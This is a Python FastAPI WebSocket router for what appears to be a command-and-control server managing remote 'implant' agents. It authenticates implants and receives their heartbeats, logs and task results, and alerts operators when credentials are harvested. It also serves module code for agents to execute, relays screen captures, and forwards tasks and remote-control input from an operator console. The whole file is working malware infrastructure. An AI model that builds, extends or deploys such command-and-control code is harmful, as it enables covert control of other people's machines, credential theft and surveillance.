import json
import logging
from datetime import datetime, timezone

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from core.auth import decode_access_token
from core.chat_engine import engine as chat_engine
from core.ws_manager import (
    ConnectionManager,
    FrontendConnection,
    build_message,
    verify_message_signature,
)
from database import database
from db.models import ChatMessage

router = APIRouter(tags=["websocket"])
manager = ConnectionManager()
logger = logging.getLogger(__name__)

# Lightweight in-memory cache for agent metadata used during hot WS paths.
_agent_info_cache: dict[str, dict] = {}


def _cache_agent_info(agent_id: str, **fields) -> None:
    entry = _agent_info_cache.setdefault(agent_id, {})
    entry.update(fields)


def _get_cached_hostname(agent_id: str) -> str:
    return _agent_info_cache.get(agent_id, {}).get("hostname") or agent_id[:12]


# ---------------------------------------------------------------------------
# Auth helpers
# ---------------------------------------------------------------------------


async def _auth_jwt(token: str) -> dict | None:
    if not token:
        return None
    try:
        payload = decode_access_token(token)
        return {"id": payload["sub"], "role": payload.get("role", "viewer")}
    except ValueError:
        return None


async def _auth_api_key(api_key: str) -> dict | None:
    if not api_key:
        return None
    try:
        from db.models import User
        user = User.get_or_none(User.api_key == api_key)
        if user:
            return {"id": str(user.id), "role": user.role}
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Frontend WebSocket — /ws/frontend?token=xxx
# ---------------------------------------------------------------------------


@router.websocket("/ws/frontend")
async def websocket_frontend(websocket: WebSocket, token: str = "") -> None:
    """
    Operator frontend WebSocket.
    Auth: ?token=<jwt_access_token>
    """
    user = await _auth_jwt(token)
    if user is None:
        await websocket.close(code=4001)
        return

    conn = await manager.connect_frontend(user["id"], websocket)
    try:
        while True:
            raw = await websocket.receive_text()
            try:
                msg = json.loads(raw)
                await _handle_frontend_message(conn, msg)
            except json.JSONDecodeError:
                logger.warning("Invalid JSON from frontend %s", user["id"])
    except WebSocketDisconnect:
        await manager.disconnect_frontend(conn)


# ---------------------------------------------------------------------------
# Agent WebSocket — /ws/agent/{agent_id}?token=xxx  or  ?api_key=xxx
# ---------------------------------------------------------------------------


@router.websocket("/ws/agent/{agent_id}")
async def websocket_agent(
    websocket: WebSocket,
    agent_id: str,
    token: str = "",
    api_key: str = "",
) -> None:
    """
    Agent implant WebSocket.
    Auth: ?token=<jwt> OR ?api_key=<hex>
    Channel: agent:{agent_id}
    """
    user = await _auth_jwt(token) or await _auth_api_key(api_key)
    if user is None:
        await websocket.close(code=4001)
        return

    conn = await manager.connect_agent(agent_id, websocket)

    # Fire on_connect alert + orchestrator trigger + chat persona event
    try:
        from core.alert_manager import AlertManager
        from core.orchestrator import Orchestrator
        from db.models import Agent as _Agent
        _agent = _Agent.get_or_none(_Agent.id == agent_id)
        _hostname = _agent.hostname if _agent else _get_cached_hostname(agent_id)
        _cache_agent_info(agent_id, hostname=_hostname)
        await AlertManager().fire(
            event="agent_connect",
            title=f"Agent connected: {_hostname}",
            message=f"Agent {agent_id[:12]} is now online.",
            severity="warning",
            agent_id=agent_id,
        )
        await Orchestrator().on_agent_connect(agent_id)
        await _emit_chat_event(
            "agent_connected",
            {"agent_id": agent_id, "hostname": _hostname},
        )
    except Exception as _exc:
        logger.debug("on_connect hooks failed: %s", _exc)

    try:
        while True:
            raw = await websocket.receive_text()
            try:
                msg = json.loads(raw)
                await manager.route_agent_message(agent_id, msg)
            except json.JSONDecodeError:
                logger.warning("Invalid JSON from agent %s", agent_id)
    except WebSocketDisconnect:
        await manager.disconnect_agent(agent_id, reason="disconnect")
        try:
            from core.alert_manager import AlertManager as _AM
            _hn = _get_cached_hostname(agent_id)
            await _AM().fire(
                event="agent_disconnect",
                title=f"Agent disconnected: {_hn}",
                message=f"Agent {agent_id[:12]} went offline.",
                severity="info",
                agent_id=agent_id,
            )
            await _emit_chat_event(
                "agent_disconnected",
                {"agent_id": agent_id, "hostname": _hn, "reason": "disconnect"},
            )
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Agent message handlers — registered into MessageRouter
# ---------------------------------------------------------------------------


async def _emit_chat_event(event_type: str, payload: dict) -> None:
    """Buffer-persist and broadcast a persona-translated chat message for an event.

    The message is tagged with a channel: 'global' for the main feed, plus
    'group:{id}' for each group the agent belongs to. Frontends receive the
    channel list so they can route the message to the appropriate conversation.
    """
    try:
        chat_msg = chat_engine.render_event(event_type, payload)
        from core.chat_buffer import ChatBuffer
        from core.shannon_ai import shannon

        agent_id = payload.get("agent_id")
        channels = _resolve_agent_channels(agent_id)

        # Persist to global channel + each group channel.
        ChatBuffer().push(event_type, payload, channel="global")
        for ch in channels:
            if ch != "global":
                ChatBuffer().push(event_type, payload, channel=ch)

        # Ingest into ShannonAi's short-term memory for contextual narratives.
        try:
            shannon_narrative = shannon.ingest_event(event_type, payload)
            chat_msg["shannon_narrative"] = shannon_narrative
        except Exception:
            pass

        # Enrich the broadcast with channel routing info + agent identity.
        chat_msg["channels"] = channels
        chat_msg["agent_id"] = agent_id
        chat_msg["hostname"] = _get_cached_hostname(agent_id) if agent_id else None

        await manager.broadcast_to_frontends(
            build_message("chat", chat_msg, agent_id=agent_id, task_id=payload.get("task_id"))
        )
    except Exception as exc:
        logger.debug("Chat event emission failed: %s", exc)


def _resolve_agent_channels(agent_id: str | None) -> list[str]:
    """Return ['global', 'group:{id}', ...] for the given agent."""
    channels = ["global"]
    if not agent_id:
        return channels
    try:
        from db.models import AgentGroup
        with database:
            groups = AgentGroup.select()
            for g in groups:
                members = g.members_list
                if agent_id in members:
                    channels.append(f"group:{g.id}")
    except Exception:
        pass
    return channels


async def _on_heartbeat(agent_id: str, msg: dict) -> None:
    """Handle heartbeat: buffer DB update + relay to frontends + chat."""
    payload = msg.get("payload", {})
    payload["agent_id"] = agent_id

    if payload.get("hostname"):
        _cache_agent_info(agent_id, hostname=payload["hostname"])

    try:
        from core.heartbeat_buffer import HeartbeatBuffer
        HeartbeatBuffer().push(agent_id, payload)
    except Exception as exc:
        logger.debug("Heartbeat buffer push failed: %s", exc)

    await manager.broadcast_to_frontends(
        build_message("heartbeat", {"agent_id": agent_id, **payload}, agent_id=agent_id)
    )
    await _emit_chat_event("heartbeat", payload)


async def _on_result(agent_id: str, msg: dict) -> None:
    """Handle task result: buffer DB update + relay to frontends."""
    payload = msg.get("payload", {})
    task_id = msg.get("task_id") or payload.get("task_id")

    if task_id:
        try:
            from core.result_buffer import ResultBuffer

            _status = payload.get("status", "completed")
            ResultBuffer().push(
                task_id=str(task_id),
                status=_status,
                result=payload.get("data"),
                error=payload.get("error"),
            )

            # Alert on task failure
            if _status == "failed":
                try:
                    from core.result_buffer import ResultBuffer as _RB
                    from core.alert_manager import AlertManager as _AM
                    _mod = _RB().get_module(str(task_id))
                    if _mod is None:
                        from db.models import Task
                        _task = Task.get_or_none(Task.id == task_id)
                        _mod = _task.module if _task else "unknown"
                    await _AM().fire(
                        event="task_failed",
                        title=f"Task failed: {_mod}",
                        message=payload.get("error") or "Task returned failed status.",
                        severity="warning",
                        agent_id=agent_id,
                        data={"task_id": task_id, "module": _mod},
                    )
                except Exception:
                    pass

            # Alert on credential harvest
            _data = payload.get("data") or {}
            _creds = _data.get("credentials") if isinstance(_data, dict) else None
            if _creds and len(_creds) > 0:
                try:
                    from core.alert_manager import AlertManager as _AM2
                    await _AM2().fire(
                        event="credential_found",
                        title=f"{len(_creds)} credential(s) harvested",
                        message=f"Agent {agent_id[:12]} collected {len(_creds)} credential(s) via task {task_id[:8]}.",
                        severity="critical",
                        agent_id=agent_id,
                        data={"task_id": task_id, "count": len(_creds)},
                    )
                except Exception:
                    pass

        except Exception as exc:
            logger.error("Result buffer push failed for task %s: %s", task_id, exc)

    # Enrich payload with module name so frontends can filter results by type
    _module = None
    if task_id:
        try:
            from db.models import Task as _Task
            _task = _Task.get_or_none(_Task.id == str(task_id))
            if _task:
                _module = _task.module
        except Exception:
            pass
    if _module and "module" not in payload:
        payload = {**payload, "module": _module}

    await manager.broadcast_to_frontends(
        build_message("result", payload, agent_id=agent_id, task_id=task_id or "")
    )
    await _emit_chat_event("result", {**payload, "agent_id": agent_id, "task_id": task_id})


async def _on_log(agent_id: str, msg: dict) -> None:
    """Handle agent log entry: persist + relay."""
    payload = msg.get("payload", {})
    try:
        from core.log_manager import LogManager
        LogManager().push(
            level=payload.get("level", "INFO"),
            message=payload.get("message", ""),
            module=payload.get("module", "agent"),
            agent_id=agent_id,
            log_type="agent",
        )
    except Exception as exc:
        logger.debug("Log push failed: %s", exc)

    await manager.broadcast_to_frontends(
        build_message("log", {"agent_id": agent_id, **payload}, agent_id=agent_id)
    )
    await _emit_chat_event("log", {"agent_id": agent_id, **payload})


async def _on_module_request(agent_id: str, msg: dict) -> None:
    """Handle agent module download request: send module code back."""
    payload = msg.get("payload", {})
    module_name = payload.get("name")
    if not module_name:
        return

    try:
        from database import database
        from db.models import Module

        with database:
            mod = Module.get_or_none(
                (Module.name == module_name) & (Module.enabled == True)
            )

        if mod:
            await manager.send_to_agent(
                agent_id,
                build_message(
                    "module_response",
                    {
                        "name": mod.name,
                        "version": mod.version,
                        "code": mod.code,
                        "signature": mod.signature,
                        "dependencies": mod.dependencies_list,
                    },
                    agent_id=agent_id,
                ),
            )
        else:
            await manager.send_to_agent(
                agent_id,
                build_message(
                    "error",
                    {"message": f"Module '{module_name}' not found or disabled"},
                    agent_id=agent_id,
                ),
            )
    except Exception as exc:
        logger.error("Module request failed for %s: %s", module_name, exc)


async def _on_error(agent_id: str, msg: dict) -> None:
    """Relay agent-side errors to frontends and log them."""
    payload = msg.get("payload", {})
    logger.warning("Agent %s reported error: %s", agent_id, payload.get("message"))
    await manager.broadcast_to_frontends(
        build_message("error", {"agent_id": agent_id, **payload}, agent_id=agent_id)
    )


async def _on_pong(agent_id: str, msg: dict) -> None:
    """Pong response — connection already touched by route_agent_message."""
    pass


async def _on_screen_frame(agent_id: str, msg: dict) -> None:
    """
    Agent sent a screen frame (base64 JPEG).
    Relay it to all frontends subscribed to channel 'screen:{agent_id}'.
    """
    await manager.broadcast_to_frontends(
        build_message("screen_frame", msg.get("data", msg.get("payload", {})), agent_id=agent_id),
        channel=f"screen:{agent_id}",
    )


# Register all handlers into the singleton router
manager.register_handler("heartbeat", _on_heartbeat)
manager.register_handler("result", _on_result)
manager.register_handler("log", _on_log)
manager.register_handler("module_request", _on_module_request)
manager.register_handler("error", _on_error)
manager.register_handler("pong", _on_pong)
manager.register_handler("screen_frame", _on_screen_frame)


# ---------------------------------------------------------------------------
# Frontend message handlers
# ---------------------------------------------------------------------------


async def _handle_frontend_message(conn: FrontendConnection, msg: dict) -> None:
    msg_type = msg.get("type")

    if msg_type == "ping":
        await conn.send(
            {"type": "pong", "timestamp": datetime.now(timezone.utc).isoformat()}
        )

    elif msg_type == "subscribe":
        payload = msg.get("payload", {})
        channel = msg.get("channel") or (payload.get("channel") if isinstance(payload, dict) else "")
        if channel:
            conn.subscribe(channel)
            await conn.send({"type": "subscribed", "channel": channel})

    elif msg_type == "unsubscribe":
        payload = msg.get("payload", {})
        channel = msg.get("channel") or (payload.get("channel") if isinstance(payload, dict) else "")
        if channel:
            conn.unsubscribe(channel)

    elif msg_type == "send_task":
        await _frontend_send_task(msg)

    elif msg_type == "input_event":
        await _frontend_input_event(msg)

    elif msg_type == "stats":
        await conn.send({"type": "stats", "payload": manager.stats()})

    else:
        logger.debug("Unhandled frontend message type: %s", msg_type)


async def _frontend_send_task(msg: dict) -> None:
    """Frontend requests a task be sent to an agent."""
    payload = msg.get("payload", {})
    agent_id = payload.get("agent_id")
    if not agent_id:
        return
    await manager.send_to_agent(
        agent_id,
        build_message("task", payload, agent_id=agent_id),
    )


async def _frontend_input_event(msg: dict) -> None:
    """
    Frontend sends a remote-control input event to a specific agent.
    msg format: {type: 'input_event', agent_id: '...', payload: {action, ...}}
    """
    agent_id = msg.get("agent_id")
    payload = msg.get("payload", {})
    if not agent_id:
        return
    await manager.send_to_agent(
        agent_id,
        build_message("input_event", payload, agent_id=agent_id),
    )
